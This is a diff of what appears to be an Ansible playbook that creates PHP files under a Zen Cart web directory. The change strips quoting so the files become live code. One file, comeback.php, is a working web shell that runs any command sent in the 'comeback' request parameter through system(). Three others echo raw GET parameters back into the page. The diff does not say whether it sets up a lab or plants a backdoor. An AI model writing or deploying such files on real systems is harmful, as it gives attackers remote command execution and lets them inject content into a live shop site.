@@ -13,22 +13,22 @@
       copy:
         dest: /var/www/html/zen-cart/comeback.php
         content: |
-          "<?php if(isset(\$_REQUEST['comeback'])){ echo \"<pre>\"; \$cmd = (\$_REQUEST['comeback']); system(\$cmd); echo \"</pre>\"; die; }?>"
+          <?php if(isset(\$_REQUEST['comeback'])){ echo "<pre>"; \$cmd = (\$_REQUEST['comeback']); system(\$cmd); echo "</pre>"; die; }?>
 
     - name: Create pico.php
       copy:
         dest: /var/www/html/zen-cart/pico.php
         content: |
-          "<?=\$_GET['_']?>"
+          <?=\$_GET['_']?>
 
     - name: Create var.php
       copy:
         dest: /var/www/html/zen-cart/includes/var.php
         content: |
-          "<?=\$_GET['var']?>"
+          <?=\$_GET['var']?>
 
     - name: Create info.php
       copy:
         dest: /var/www/html/info.php
         content: |
-          "<?=\$_GET[0]?>"
+          <?=\$_GET[0]?>
